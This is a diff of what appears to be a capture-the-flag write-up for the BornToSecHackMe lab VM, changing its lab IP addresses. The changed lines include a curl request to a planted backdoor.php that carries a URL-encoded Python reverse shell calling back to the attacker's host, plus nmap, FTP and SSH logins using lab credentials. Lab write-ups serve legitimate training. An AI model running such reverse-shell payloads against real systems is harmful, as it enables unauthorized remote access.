@@ -18,7 +18,7 @@ Ncat: Listening on 0.0.0.0:1234
 **Server**:
 
 ```sh
-curl --insecure 'https://192.168.1.22/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.47%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
+curl --insecure 'https://192.168.56.2/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.47%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
 ```
 
 We can search some other informations on the server to find an other way to be root...
@@ -51,9 +51,9 @@ Try it on ssh... Nope.
 Remember all the open services
 
 ```
-$ nmap 192.168.1.22                                                                    !
+$ nmap 192.168.56.2                                                                    !
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 16:50 CEST
-Nmap scan report for borntosechackme.home (192.168.1.22)
+Nmap scan report for borntosechackme.home (192.168.56.2)
 Host is up (0.00025s latency).
 Not shown: 994 closed ports
 PORT    STATE SERVICE
@@ -69,10 +69,10 @@ We can try ftp
 ## FTP
 
 ```
-$ ftp 192.168.1.22
-Connected to 192.168.1.22.
+$ ftp 192.168.56.2
+Connected to 192.168.56.2.
 220 Welcome on this server
-Name (192.168.1.22:nico): lmezard
+Name (192.168.56.2:nico): lmezard
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -154,7 +154,7 @@ $ echo -n 'Iheartpwnage' | sha256sum
 Connect to ssh with the user `laurie` and the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
 ```sh
-$ ssh laurie@192.168.1.22           
+$ ssh laurie@192.168.56.2           
         ____                _______    _____           
        |  _ \              |__   __|  / ____|          
        | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
@@ -163,7 +163,7 @@ $ ssh laurie@192.168.1.22
        |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
 
                        Good luck & Have fun
-laurie@192.168.1.22's password: 
+laurie@192.168.56.2's password: 
 laurie@BornToSecHackMe:~$
 ```
 
